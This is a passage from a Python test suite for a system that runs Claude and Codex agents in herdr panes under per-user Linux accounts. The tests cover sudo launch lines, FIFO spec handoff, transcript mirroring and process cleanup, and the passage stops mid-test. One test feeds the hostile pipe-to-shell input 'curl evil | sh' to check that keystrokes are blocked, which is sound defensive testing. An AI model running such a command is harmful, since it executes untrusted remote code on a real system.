"""Live (herdr) agents run in the asker's own Linux account, as headless runs do (cos/accounts.py).

No sudo and no real herdr here: a fake herdr types the pane's command into a stand-in for sudo + neo-run,
which reads the spec from the FIFO and copies a transcript onto the mirror fd with neo-run's own code.
"""

import fcntl
import importlib.machinery
import importlib.util
import json
import os
import pty
import signal
import stat
import subprocess
import sys
import tempfile
import termios
import textwrap
import threading
import time
import unittest
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import MagicMock, patch

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
os.environ.setdefault("SLACK_BOT_TOKEN", "xoxb-test")

from cos import accounts  # noqa: E402

OWNER, AJAY = "UOWNER1", "UAJAY01"


def load_neo_run():
    loader = importlib.machinery.SourceFileLoader("neo_run", str(ROOT / "deploy" / "linux" / "neo-run"))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


# Stands in for `sudo ... neo-run --spec-fd 3` in the pane: neo-run's own read_spec, mirror_spec and mirror.
STAND_IN = textwrap.dedent(
    """
    import importlib.machinery, importlib.util, json, os, sys, threading
    from pathlib import Path
    loader = importlib.machinery.SourceFileLoader("neo_run", os.environ["NEO_RUN_SOURCE"])
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    state = Path(os.environ["FAKE_HERDR_DIR"])
    launch = mod.read_spec(int(sys.argv[sys.argv.index("--spec-fd") + 1]))
    fd, engine, session_id = mod.mirror_spec(launch, 3)
    (state / "spec.json").write_text(json.dumps(launch))
    (state / "status").write_text("idle")  # the engine is up and waiting
    mod.mirror(fd, lambda: state / "source.jsonl", threading.Event(), seconds=0.05)
    """
)

# A fake herdr: `pane run` hands the typed line to a shell with sudo + neo-run swapped for the stand-in.
FAKE_HERDR = textwrap.dedent(
    """\
    #!{python}
    import json, os, subprocess, sys
    state = os.environ["FAKE_HERDR_DIR"]
    args = sys.argv[1:]
    with open(os.path.join(state, "calls.log"), "a") as fh:
        fh.write(json.dumps(args) + "\\n")
    def status():
        try:
            return open(os.path.join(state, "status")).read().strip()
        except OSError:
            return ""
    def out(result):
        print(json.dumps({{"result": result}}))
    if args[:2] == ["session", "list"]:
        print(json.dumps({{"sessions": [{{"name": os.environ.get("HERDR_SESSION"), "running": True}}]}}))
    elif args[:2] == ["workspace", "create"]:
        out({{"workspace": {{"workspace_id": "w9"}}, "root_pane": {{"pane_id": "w9:p1"}}}})
    elif args[:2] == ["pane", "run"]:
        line = args[3]
        head, _, rest = line.partition(" --spec-fd ")
        shell = sys.executable + " " + os.environ["STAND_IN"] + " --spec-fd " + rest
        proc = subprocess.Popen(["bash", "-c", shell], cwd=state, start_new_session=True,
                                stdout=subprocess.DEVNULL, stderr=open(os.path.join(state, "stand_in.err"), "w"))
        open(os.path.join(state, "stand_in.pid"), "w").write(str(proc.pid))
    elif args[:2] == ["agent", "start"]:
        open(os.path.join(state, "start_args"), "w").write(json.dumps(args))
        open(os.path.join(state, "status"), "w").write("idle")
        out({{"agent": {{"agent": "claude", "agent_status": "idle", "name": args[2],
                        "agent_session": {{"kind": "id", "value": "sess-neo"}}}}}})
    elif args[:2] == ["agent", "get"]:
        s = status()
        if not s or s == "gone":
            print(json.dumps({{"error": {{"code": "agent_not_found", "message": "no agent"}}}}), file=sys.stderr)
            sys.exit(1)
        # In a person's account herdr knows no session: its hook can't reach neo's herdr socket.
        out({{"agent": {{"agent": "claude", "agent_status": s, "name": args[2]}}}})
    elif args[:2] == ["agent", "prompt"]:
        with open(os.path.join(state, "source.jsonl"), "a") as fh:  # lands in the account's transcript
            fh.write(json.dumps({{"type": "user", "message": {{"content": args[3]}}}}) + "\\n")
        out({{"type": "ok"}})
    elif args[:2] == ["pane", "process-info"]:
        try:
            names = json.loads(open(os.path.join(state, "fg")).read())
        except OSError:
            names = ["sudo", "python3", "claude"]
        out({{"process_info": {{"foreground_processes": [{{"name": n}} for n in names]}}}})
    elif args[:2] == ["agent", "read"] or args[:2] == ["pane", "read"]:
        print("❯ ")
    else:
        out({{"type": "ok"}})
    """
)


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.state = base / "state"
        self.state.mkdir()
        fake = base / "herdr"
        fake.write_text(FAKE_HERDR.format(python=sys.executable))
        fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
        stand_in = base / "stand_in.py"
        stand_in.write_text(STAND_IN)
        self.work = base / "work"
        (self.work / "app").mkdir(parents=True)
        (base / "accounts.json").write_text(json.dumps({OWNER: "neo-anil", AJAY: "neo-ajay"}))
        self.env = patch.dict(os.environ, {
            "HERDR_CLI_PATH": str(fake), "FAKE_HERDR_DIR": str(self.state), "STAND_IN": str(stand_in),
            "NEO_RUN_SOURCE": str(ROOT / "deploy" / "linux" / "neo-run"),
            "COS_HOME": str(base), "HOME": str(base / "home"), "NEO_WORKDIR": str(self.work),
            "NEO_PEOPLE_DIR": str(base / "people"), "NEO_ACCOUNTS_FILE": str(base / "accounts.json"),
            "NEO_OWNER_USER": OWNER, "NEO_ACCOUNTS": "1", "NEO_REMOTE_CONTROL": "0",
            "NEO_SHARED_CLAUDE_TOKEN": "sk-owner-secret",
        })
        self.env.start()
        for key in ("NEO_ACCOUNT_ENV", "NEO_MODE", "NEO_SHARED_GH_TOKEN", "NEO_SHARED_OPENAI_KEY"):
            os.environ.pop(key, None)
        # Never a real account: an unknown name must fail the test, not create anyone.
        self.no_create = patch.object(accounts, "_create", side_effect=AssertionError("tests must not create accounts"))
        self.no_create.start()
        self.no_logins = patch("cos.logins.signed_in", return_value=None)
        self.no_logins.start()
        from cos import interactive
        self.interactive = interactive
        self.timing = patch.multiple(interactive, STARTUP_SETTLE_SECONDS=0.3, PROMPT_CONFIRM_SECONDS=1.5, POLL_SECONDS=0.05)
        self.timing.start()
        self.runs = []

    def tearDown(self):
        for irun in self.runs:
            irun.stop_watching()
            if irun._thread:
                irun._thread.join(timeout=2)
        pid = self.state / "stand_in.pid"
        if pid.exists():
            try:
                os.killpg(int(pid.read_text()), signal.SIGTERM)
            except (ProcessLookupError, PermissionError):
                pass
        self.timing.stop()
        self.no_logins.stop()
        self.no_create.stop()
        self.env.stop()
        self.tmp.cleanup()

    def calls(self) -> list:
        path = self.state / "calls.log"
        return [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []

    def wait_for(self, predicate, timeout=8, what="condition"):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if predicate():
                return
            time.sleep(0.05)
        self.fail(f"timed out waiting for {what}; stand-in said: "
                  + ((self.state / "stand_in.err").read_text() if (self.state / "stand_in.err").exists() else ""))

    def start(self, user=None, extra=None, system=None, events=None):
        from cos.herdr import Herdr

        irun = self.interactive.InteractiveRun.start(
            "claude", "fix the flaky test", str(self.work / "app"), "slack-1", "slack",
            {"slack_channel": "C1", "slack_thread": "1.2", "slack_user": user, **(extra or {})},
            Herdr("testsess"), (events.append if events is not None else None), system=system,
        )
        self.runs.append(irun)
        return irun


class WhichAccountTest(Base):
    """The account mirrors a headless run's: the asker's own, else the owner's; never the service account."""

    def create(self, **extra):
        from cos.runner import Run
        return Run.create("claude", "hi", str(self.work / "app"), "full", source="slack", runtime="herdr", extra=extra).meta()

    def test_a_person_gets_theirs_and_the_owner_dashboard_and_scheduled_runs_get_the_owners(self):
        self.assertEqual(self.create(slack_user=AJAY)["account"], "neo-ajay")
        self.assertEqual(self.create(slack_user=OWNER)["account"], "neo-anil")
        self.assertEqual(self.create()["account"], "neo-anil")  # the dashboard: nobody's Slack id
        meta = self.create(slack_user=AJAY)
        self.assertEqual(meta["cwd"], str((Path(accounts.home('neo-ajay')) / "code/app").resolve()))  # in their ~/code

    def test_a_caller_may_keep_a_run_in_neos_own_checkout(self):
        meta = self.create(slack_user=OWNER, account=None)
        self.assertIsNone(meta["account"])
        self.assertEqual(meta["cwd"], str((self.work / "app").resolve()))

    def test_accounts_off_changes_nothing(self):
        os.environ["NEO_ACCOUNTS"] = "0"
        meta = self.create(slack_user=AJAY)
        self.assertNotIn("account", meta)
        self.assertEqual(meta["cwd"], str((self.work / "app").resolve()))


class LiveInAccountTest(Base):
    def test_the_pane_runs_sudo_and_neo_run_and_the_spec_comes_through_the_fifo(self):
        irun = self.start(user=AJAY, system="How to do an RCA:\n1. reproduce it", extra={"git_name": "Ajay"})
        meta = irun.run.meta()
        self.assertEqual(meta["account"], "neo-ajay")
        calls = self.calls()
        self.assertFalse([c for c in calls if c[:2] == ["agent", "start"]], "agent start can only run plain `claude`")
        create = next(c for c in calls if c[:2] == ["workspace", "create"])
        self.assertEqual(create[create.index("--cwd") + 1], str(irun.run.dir))  # a folder neo can enter
        line = next(c for c in calls if c[:2] == ["pane", "run"])[3]
        fifo, mirror, log = (irun.run.dir / n for n in ("spec.fifo", "transcript.jsonl", "neo-run.log"))
        # exec: neo's shell is replaced, so no shell of neo's is left for keys meant for the agent
        self.assertTrue(line.startswith(" exec sudo "))
        self.assertEqual(line, f" exec sudo -n -C 6 -u neo-ajay /usr/local/bin/neo-run --spec-fd 3 3<{fifo} 4>>{mirror} 5>>{log}")
        for secret in ("sk-owner-secret", "RCA", "fix the flaky test", "NEO_RUN_ID", "--settings"):
            self.assertNotIn(secret, line)
        self.assertTrue(any(c[:3] == ["agent", "rename", "w9:p1"] and c[3] == meta["herdr_agent"] for c in calls))

        spec = json.loads((self.state / "spec.json").read_text())
        self.assertFalse(fifo.exists(), "the FIFO is gone once read")
        self.assertIs(spec["tty"], True)
        self.assertEqual(spec["cwd"], meta["cwd"])
        self.assertEqual(spec["shared"]["claude_token"], "sk-owner-secret")
        self.assertEqual(spec["env"]["NEO_RUN_ID"], meta["id"])
        self.assertEqual(spec["git_name"], "Ajay")
        argv = spec["argv"]
        self.assertEqual(os.path.basename(argv[0]), "claude")
        self.assertEqual(argv[argv.index("--append-system-prompt-file") + 1], "{file:system.md}")
        self.assertIn("1. reproduce it", spec["files"]["system.md"])
        settings = json.loads(argv[argv.index("--settings") + 1])
        self.assertIn("/usr/bin/python3 -I '{file:conclusion.py}'", settings["hooks"]["Stop"][0]["hooks"][0]["command"])
        self.assertIs(settings["skipDangerousModePermissionPrompt"], True)  # this run's, not the person's settings
        self.assertEqual(spec["log_fd"], 5)
        self.assertIn("def decide", spec["files"]["conclusion.py"])
        self.assertEqual(argv[argv.index("--session-id") + 1], meta["session_id"])
        self.assertEqual(spec["mirror"], {"fd": 4, "engine": "claude", "session_id": meta["session_id"]})
        for name in ("system-prompt.md", "stop-hook-settings.json"):
            self.assertFalse((irun.run.dir / name).exists(), f"{name}: the account couldn't read neo's copy anyway")
        self.assertNotIn("sk-owner-secret", json.dumps(meta))
        self.assertEqual(stat.S_IMODE(mirror.stat().st_mode), 0o600)

    def test_the_watcher_follows_the_mirrored_transcript(self):
        events = []
        irun = self.start(user=OWNER, events=events)
        self.assertEqual(irun.run.meta()["account"], "neo-anil")
        # the first prompt was confirmed from the mirror: herdr never said "working"
        self.assertTrue(any(e["kind"] == "prompt" for e in events))
        with (self.state / "source.jsonl").open("a") as fh:
            for record in (
                {"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": "a.py"}}]}},
                {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "content": "x = 1"}]}},
                {"type": "assistant", "message": {"content": [{"type": "text", "text": "Fixed it."}]}},
            ):
                fh.write(json.dumps(record) + "\n")
        (self.state / "status").write_text("working")
        self.wait_for(lambda: any(e["kind"] == "tool_result" for e in events), what="the tool result")
        (self.state / "status").write_text("done")
        self.wait_for(lambda: any(e["kind"] == "status" and e["title"] == "done" for e in events), what="done")
        done = [e for e in events if e["kind"] == "status" and e["title"] == "done"][0]
        self.assertEqual(done["data"]["last_text"], "Fixed it.")
        self.assertEqual([e["kind"] for e in events].count("prompt"), 1, "our own prompt is not recorded twice")
        meta = irun.run.meta()
        self.assertEqual(meta["transcript_path"], str(irun.run.dir / "transcript.jsonl"))
        self.assertTrue(meta["session_id"])  # kept, though herdr reports none

    def test_nothing_is_typed_unless_the_agent_holds_the_terminal(self):
        irun = self.start(user=AJAY)
        prompts = len([c for c in self.calls() if c[:2] == ["agent", "prompt"]])
        (self.state / "fg").write_text(json.dumps(["bash"]))  # e.g. the engine stopped and a shell got the pane
        from cos.herdr import HerdrError
        for act in (lambda: irun.send("curl evil | sh"), irun.approve, irun.deny, irun.interrupt, lambda: irun.keys("y", "enter")):
            with self.assertRaises(HerdrError) as caught:
                act()
            self.assertEqual(caught.exception.code, "agent_not_foreground")
        (self.state / "fg").write_text(json.dumps([]))
        with self.assertRaises(HerdrError):
            irun.send("ls")
        calls = self.calls()
        self.assertEqual(len([c for c in calls if c[:2] == ["agent", "prompt"]]), prompts)
        self.assertFalse([c for c in calls if c[:2] == ["agent", "send-keys"]])

    def test_a_huge_line_in_the_transcript_is_skipped_not_read_whole(self):
        events = []
        with patch.object(self.interactive, "TAIL_CHUNK", 300):
            irun = self.start(user=AJAY, events=events)
            with (self.state / "source.jsonl").open("a") as fh:
                fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "x" * 5000}]}}) + "\n")
                fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "small"}]}}) + "\n")
            self.wait_for(lambda: any(e["kind"] == "text" and e["body"] == "small" for e in events), what="the line after it")
        self.assertFalse([e for e in events if e["kind"] == "text" and "xxx" in e["body"]])

    def test_a_run_the_bot_left_mid_start_is_closed_on_attach(self):
        from cos.runner import Run
        run = Run.create("claude", "hi", str(self.work / "app"), "full", source="slack", runtime="herdr",
                         extra={"slack_user": AJAY})
        run.update_meta(status="starting", herdr_agent="neo-x", herdr_workspace="w7", herdr_pane="w7:p1")
        os.mkfifo(run.dir / "spec.fifo", 0o600)
        events = []
        irun = self.interactive.InteractiveRun.attach(run.id, on_event=events.append)
        self.assertFalse((run.dir / "spec.fifo").exists())
        self.assertEqual(run.meta()["status"], "closed")
        self.assertFalse(irun.alive)
        self.assertIn(["workspace", "close", "w7"], self.calls())
        self.assertEqual(events[-1]["title"], "Never started")

    def test_a_reattached_watcher_reads_the_mirror_from_its_offset(self):
        events = []
        irun = self.start(user=AJAY, events=events)
        self.wait_for(lambda: irun.run.meta().get("transcript_offset"), what="the prompt to be read from the mirror")
        irun.stop_watching()
        irun._thread.join(timeout=2)
        with (self.state / "source.jsonl").open("a") as fh:
            fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "after restart"}]}}) + "\n")
        later = []
        again = self.interactive.InteractiveRun.attach(irun.run.id, on_event=later.append)
        self.runs.append(again)
        self.wait_for(lambda: any(e["kind"] == "text" and e["body"] == "after restart" for e in later), what="the text")
        self.assertFalse([e for e in later if e["kind"] == "prompt"], "nothing already recorded is recorded again")

    def test_accounts_off_still_uses_herdr_agent_start_in_neos_account(self):
        os.environ["NEO_ACCOUNTS"] = "0"
        # herdr's session id names a transcript in neo's own home, as before accounts
        transcript = Path(os.environ["HOME"]) / ".claude" / "projects" / "-work-app" / "sess-neo.jsonl"
        transcript.parent.mkdir(parents=True)
        (self.state / "source.jsonl").touch()
        transcript.symlink_to(self.state / "source.jsonl")
        irun = self.start(user=AJAY, system="Be brief.")
        meta = irun.run.meta()
        self.assertNotIn("account", meta)
        calls = self.calls()
        self.assertFalse([c for c in calls if c[:2] == ["pane", "run"]])
        args = json.loads((self.state / "start_args").read_text())
        self.assertEqual(args[args.index("--kind") + 1], "claude")
        self.assertEqual(Path(args[args.index("--append-system-prompt-file") + 1]).read_text(), "Be brief.")
        self.assertNotIn("--session-id", args)
        self.assertEqual(meta["session_id"], "sess-neo")  # from herdr, as before


class FleetRowTest(Base):
    def test_a_live_agent_in_an_account_shows_its_mirrored_transcript(self):
        from cos import fleet

        mirror = Path(self.tmp.name) / "transcript.jsonl"
        mirror.write_text(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "Done?"}]}}) + "\n")
        run = {"id": "20261102-120000-abcdef", "account": "neo-ajay", "transcript_path": str(mirror),
               "cwd": "/home/neo-ajay/code/app", "session_id": "s-1", "herdr_agent": "neo-x", "engine": "claude"}
        agent = {"agent": "claude", "name": "neo-x", "pane_id": "w9:p1", "agent_status": "idle", "cwd": "/srv/runs/x"}
        row = fleet._agent_row("testsess", agent, {("testsess", "neo-x"): run})
        self.assertEqual((row["cwd"], row["session_id"], row["last_text"]), ("/home/neo-ajay/code/app", "s-1", "Done?"))
        self.assertTrue(row["asks"])


class PaneLaunchTest(unittest.TestCase):
    def test_sudo_keeps_every_fd_neo_run_needs(self):
        self.assertEqual(accounts.command("neo-ajay", 7)[:4], ["sudo", "-n", "-C", "8"])
        self.assertEqual(accounts.command("neo-ajay", 3, 4)[:4], ["sudo", "-n", "-C", "5"])
        self.assertEqual(accounts.command("neo-ajay", 3, 4)[-2:], ["--spec-fd", "3"])  # the sudoers rule's form

    def test_the_pane_line_replaces_neos_shell_and_quotes_odd_paths(self):
        line = accounts.pane_command("neo-ajay", "/runs/a b/spec.fifo", "/runs/a b/t.jsonl", "/runs/a b/l.log")
        self.assertTrue(line.startswith(" exec sudo -n -C 6 -u neo-ajay /usr/local/bin/neo-run --spec-fd 3 "))
        self.assertTrue(line.endswith(" 3<'/runs/a b/spec.fifo' 4>>'/runs/a b/t.jsonl' 5>>'/runs/a b/l.log'"))

    def test_the_fifo_hands_the_spec_to_its_first_reader_then_is_gone(self):
        folder = Path(tempfile.mkdtemp())
        fifo = folder / "spec.fifo"
        data = json.dumps({"argv": ["claude"], "big": "x" * 300_000}).encode()  # more than a pipe holds
        feeder = accounts.offer_spec(fifo, data, wait=10)
        self.assertTrue(stat.S_ISFIFO(fifo.stat().st_mode))
        self.assertEqual(stat.S_IMODE(fifo.stat().st_mode), 0o600)
        with open(fifo, "rb") as fh:
            self.assertEqual(fh.read(), data)
        feeder.join(timeout=5)
        self.assertFalse(fifo.exists())

    def test_an_unread_fifo_is_removed(self):
        fifo = Path(tempfile.mkdtemp()) / "spec.fifo"
        accounts.offer_spec(fifo, b"{}", wait=0.2).join(timeout=5)
        self.assertFalse(fifo.exists())


class NeoRunLiveTest(unittest.TestCase):
    """neo-run's live-agent parts: the terminal, and the transcript mirror."""

    def setUp(self):
        self.mod = load_neo_run()
        self.home = Path(tempfile.mkdtemp()) / "neo-ajay"
        (self.home / "code" / "app").mkdir(parents=True)

    def run_main(self, spec: dict) -> MagicMock:
        """main() as far as it goes without sudo: the engine's Popen is caught, not started."""
        read_fd, write_fd = os.pipe()
        os.write(write_fd, json.dumps(spec).encode())
        os.close(write_fd)
        child = MagicMock(pid=999_999_999)
        child.wait.return_value = 0
        with patch.object(self.mod, "account_home", return_value=self.home), \
                patch.object(self.mod, "engine_path", return_value="/usr/bin/claude"), \
                patch.object(self.mod.subprocess, "Popen", return_value=child) as popen, \
                patch.object(self.mod.signal, "signal"), \
                patch.object(self.mod, "terminal_fd", return_value=None), \
                patch.object(self.mod, "claude_running", return_value=False), \
                patch.object(sys, "argv", ["neo-run", "--spec-fd", str(read_fd)]), \
                patch.dict(os.environ, {"TERM": "xterm-256color"}):
            self.assertEqual(self.mod.main(), 0)
        return popen

    def test_a_live_agent_keeps_the_terminal_and_a_headless_one_gets_its_own_session(self):
        popen = self.run_main({"argv": ["claude"], "cwd": str(self.home / "code" / "app"), "tty": True})
        # its own group, but in the pane's session: herdr sees it as the foreground job (see the pty test)
        self.assertEqual(popen.call_args.kwargs["process_group"], 0)
        self.assertNotIn("start_new_session", popen.call_args.kwargs)
        self.assertEqual(popen.call_args.kwargs["env"]["TERM"], "xterm-256color")
        popen = self.run_main({"argv": ["claude"], "cwd": ""})
        self.assertIs(popen.call_args.kwargs["start_new_session"], True)
        self.assertNotIn("TERM", popen.call_args.kwargs["env"])

    def test_a_live_claude_skips_first_run_screens_but_keeps_the_persons_choices(self):
        self.run_main({"argv": ["claude"], "cwd": "", "tty": True})
        self.assertEqual(json.loads((self.home / ".claude.json").read_text()), {"hasCompletedOnboarding": True, "theme": "dark"})
        self.assertFalse((self.home / ".claude" / "settings.json").exists(), "the person's own settings are theirs")
        mine = json.dumps({"theme": "light", "projects": {"x": {}}})
        (self.home / ".claude.json").write_text(mine)
        with patch.object(self.mod, "claude_running", return_value=True):  # it rewrites the file itself: hands off
            self.mod.prepare_live_claude(self.home)
        self.assertEqual((self.home / ".claude.json").read_text(), mine)
        self.run_main({"argv": ["claude"], "cwd": "", "tty": True})
        self.assertEqual(json.loads((self.home / ".claude.json").read_text()),
                         {"hasCompletedOnboarding": True, "theme": "light", "projects": {"x": {}}})
        (self.home / ".claude.json").unlink()
        self.run_main({"argv": ["claude", "-p"], "cwd": ""})  # headless: no screens to skip, nothing touched
        self.assertFalse((self.home / ".claude.json").exists())

    def test_bad_mirrors_are_refused(self):
        read_fd, write_fd = os.pipe()
        try:
            for mirror in ({"fd": 1, "engine": "claude"}, {"fd": 3, "engine": "claude"}, {"fd": write_fd, "engine": "bash"},
                           {"fd": True, "engine": "claude"}, {"fd": write_fd, "engine": "claude", "session_id": "../x"},
                           {"fd": 250, "engine": "claude"}):
                with self.assertRaises(SystemExit, msg=mirror):
                    self.mod.mirror_spec({"mirror": mirror}, 3)
            self.assertEqual(self.mod.mirror_spec({"mirror": {"fd": write_fd, "engine": "codex"}}, 3), (write_fd, "codex", ""))
            self.assertIsNone(self.mod.mirror_spec({}, 3))
        finally:
            os.close(read_fd)
            os.close(write_fd)

    def test_the_mirror_copies_the_transcript_as_it_grows_and_once_more_at_the_end(self):
        source = self.home / "t.jsonl"
        out = self.home / "mirror.jsonl"
        fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
        found = []
        stop = threading.Event()
        copier = threading.Thread(target=self.mod.mirror, args=(fd, lambda: source if found else None, stop, 0.02))
        copier.start()
        time.sleep(0.1)
        found.append(1)
        source.write_bytes(b'{"a": 1}\n{"b"')
        deadline = time.monotonic() + 5
        while out.read_bytes() != b'{"a": 1}\n{"b"' and time.monotonic() < deadline:
            time.sleep(0.02)
        with source.open("ab") as fh:
            fh.write(b': 2}\n')
        stop.set()
        copier.join(timeout=5)
        self.assertEqual(out.read_bytes(), b'{"a": 1}\n{"b": 2}\n')
        with self.assertRaises(OSError):
            os.fstat(fd)  # closed when done

    def test_the_mirror_reads_in_bounded_chunks_up_to_a_cap(self):
        source = self.home / "t.jsonl"
        source.write_bytes(b"a" * 1000)
        out = self.home / "mirror.jsonl"
        fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
        stop = threading.Event()
        stop.set()
        reads = []
        real = self.mod.read_regular
        with patch.object(self.mod, "read_regular", side_effect=lambda *a: reads.append(a[2]) or real(*a)):
            self.mod.mirror(fd, lambda: source, stop, 0.01, limit=700, chunk_size=128)
        self.assertEqual(out.read_bytes(), b"a" * 700)
        self.assertTrue(reads and max(reads) <= 128)

    def test_the_mirror_copies_only_a_regular_file(self):
        real = self.home / "real.jsonl"
        real.write_text("secret of someone else\n")
        link = self.home / "link.jsonl"
        link.symlink_to(real)
        fifo = self.home / "fifo.jsonl"
        os.mkfifo(fifo)
        for path in (link, fifo, self.home):
            out = self.home / f"out-{path.name}"
            fd = os.open(out, os.O_WRONLY | os.O_CREAT, 0o600)
            stop = threading.Event()
            stop.set()
            copier = threading.Thread(target=self.mod.mirror, args=(fd, lambda p=path: p, stop, 0.01))
            copier.start()
            copier.join(timeout=5)
            self.assertFalse(copier.is_alive(), f"{path.name}: never block on it")
            self.assertEqual(out.read_bytes(), b"", path.name)

    def test_two_codex_runs_in_one_folder_never_mirror_the_same_rollout(self):
        cwd = self.home / "code" / "app"
        day = self.home / ".codex" / "sessions" / "2026" / "11" / "02"
        day.mkdir(parents=True)
        spawn = time.time()

        def rollout(name, start):
            stamp = datetime.fromtimestamp(start, timezone.utc).isoformat().replace("+00:00", "Z")
            path = day / f"rollout-{name}.jsonl"
            path.write_text(json.dumps({"type": "session_meta", "payload": {"cwd": str(cwd), "timestamp": stamp}}) + "\n")
            return path

        rollout("old", spawn - 60)  # an earlier session in the same folder: never this run's
        first, second = rollout("a", spawn + 1), rollout("b", spawn + 2)
        root = self.home / ".neo-run"
        mine, theirs = root / "run-1", root / "run-2"
        for folder in (mine, theirs):
            folder.mkdir(parents=True)
            (folder / ".pid").write_text(str(os.getpid()))
        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, spawn, theirs), first)
        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, spawn, mine), second)
        self.assertEqual((mine / ".claim").read_text(), str(second))
        (root / "run-3").mkdir()
        self.assertIsNone(self.mod.find_transcript(self.home, "codex", "", cwd, spawn + 10, root / "run-3"))

    def test_folders_left_by_a_killed_neo_run_are_swept(self):
        root = self.home / ".neo-run"
        dead = subprocess.Popen([sys.executable, "-c", "pass"])
        dead.wait()
        for name, pid in (("killed", dead.pid), ("running", os.getpid())):
            (root / name).mkdir(parents=True)
            (root / name / ".pid").write_text(str(pid))
        (root / "old").mkdir()
        (root / "new").mkdir()
        os.utime(root / "old", (time.time() - 2 * 86400,) * 2)
        folder, paths = self.mod.write_files(self.home, "run-1", {"system.md": "hi"})
        self.assertEqual(sorted(p.name for p in root.iterdir()), ["new", "run-1", "running"])
        self.assertEqual((folder / ".pid").read_text(), str(os.getpid()))
        self.assertEqual(Path(paths["system.md"]).read_text(), "hi")

    def test_the_transcript_is_found_in_the_accounts_home(self):
        claude = self.home / ".claude" / "projects" / "-home-neo-ajay-code-app" / "abc-123.jsonl"
        claude.parent.mkdir(parents=True)
        claude.write_text("{}\n")
        cwd = self.home / "code" / "app"
        self.assertEqual(self.mod.find_transcript(self.home, "claude", "abc-123", cwd, 0), claude)
        self.assertIsNone(self.mod.find_transcript(self.home, "claude", "*", cwd, 0))
        rollout = self.home / ".codex" / "sessions" / "2026" / "11" / "02" / "rollout-x-th-1.jsonl"
        rollout.parent.mkdir(parents=True)
        now = time.time()
        stamp = datetime.fromtimestamp(now, timezone.utc).isoformat()
        rollout.write_text(json.dumps({"payload": {"cwd": str(cwd), "timestamp": stamp}}) + "\n")
        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, now), rollout)
        self.assertEqual(self.mod.find_transcript(self.home, "codex", "th-1", cwd, 0), rollout)
        self.assertIsNone(self.mod.find_transcript(self.home, "codex", "", self.home, now))


if __name__ == "__main__":
    unittest.main()


# Stands in for neo-run as the account: the real main(), with its account and engine looked up here.
PTY_NEO_RUN = textwrap.dedent(
    """
    import importlib.machinery, importlib.util, os, sys
    from pathlib import Path
    from unittest.mock import patch
    loader = importlib.machinery.SourceFileLoader("neo_run", os.environ["NEO_RUN_SOURCE"])
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    with patch.object(mod, "account_home", return_value=Path(os.environ["FAKE_HOME"])), \\
            patch.object(mod, "engine_path", return_value=sys.executable):
        sys.exit(mod.main())
    """
)
PTY_ENGINE = textwrap.dedent(
    """
    import json, os, subprocess, time
    kid = subprocess.Popen(["sleep", "300"])  # what an engine leaves running: an MCP server, a shell
    info = {"engine": os.getpid(), "pgid": os.getpgrp(), "kid": kid.pid, "kid_pgid": os.getpgid(kid.pid),
            "foreground": os.tcgetpgrp(0)}
    open(os.environ["OUT"] + ".tmp", "w").write(json.dumps(info))
    os.rename(os.environ["OUT"] + ".tmp", os.environ["OUT"])
    time.sleep(300)
    """
)


def _alive(pid: int) -> bool:
    try:
        with open(f"/proc/{pid}/stat") as fh:
            return fh.read().rsplit(") ", 1)[1][0] != "Z"
    except (OSError, IndexError):
        return False


class NeoRunTerminalTest(unittest.TestCase):
    """neo-run in a real terminal (a pty), as in a herdr pane: the engine gets its own group and the
    terminal, and a stop takes the whole group, not just the engine."""

    def test_stop_takes_the_engines_whole_group_and_the_terminal_was_the_engines(self):
        base = Path(tempfile.mkdtemp())
        home = base / "neo-ajay"
        (home / "code").mkdir(parents=True)
        (base / "neo_run_pty.py").write_text(PTY_NEO_RUN)
        out = base / "out.json"
        spec = {"argv": ["claude", "-c", PTY_ENGINE], "cwd": "", "tty": True, "env": {"OUT": str(out)}}
        read_fd, write_fd = os.pipe()
        os.write(write_fd, json.dumps(spec).encode())
        os.close(write_fd)
        master, slave = pty.openpty()

        def own_terminal():  # like the pane: a session whose controlling terminal is the pty
            os.setsid()
            fcntl.ioctl(0, termios.TIOCSCTTY, 0)

        proc = subprocess.Popen([sys.executable, str(base / "neo_run_pty.py"), "--spec-fd", str(read_fd)],
                                stdin=slave, stdout=slave, stderr=slave, pass_fds=(read_fd,), preexec_fn=own_terminal,
                                env={"PATH": os.environ["PATH"], "FAKE_HOME": str(home),
                                     "NEO_RUN_SOURCE": str(ROOT / "deploy" / "linux" / "neo-run")})
        os.close(slave)
        os.close(read_fd)
        info = None
        try:
            deadline = time.monotonic() + 15
            while not out.exists() and time.monotonic() < deadline:
                time.sleep(0.05)
            info = json.loads(out.read_text())
            self.assertEqual(info["pgid"], info["engine"], "the engine leads its own group")
            self.assertNotEqual(info["pgid"], os.getpgid(proc.pid), "not neo-run's group")
            self.assertEqual(info["kid_pgid"], info["pgid"])
            self.assertEqual(info["foreground"], info["pgid"], "the engine holds the terminal")
            proc.send_signal(signal.SIGTERM)  # what sudo relays when neo stops the run
            proc.wait(timeout=15)
            deadline = time.monotonic() + 5
            while time.monotonic() < deadline and any(_alive(p) for p in (info["engine"], info["kid"])):
                time.sleep(0.05)
            self.assertFalse(_alive(info["kid"]), "what the engine started dies with it")
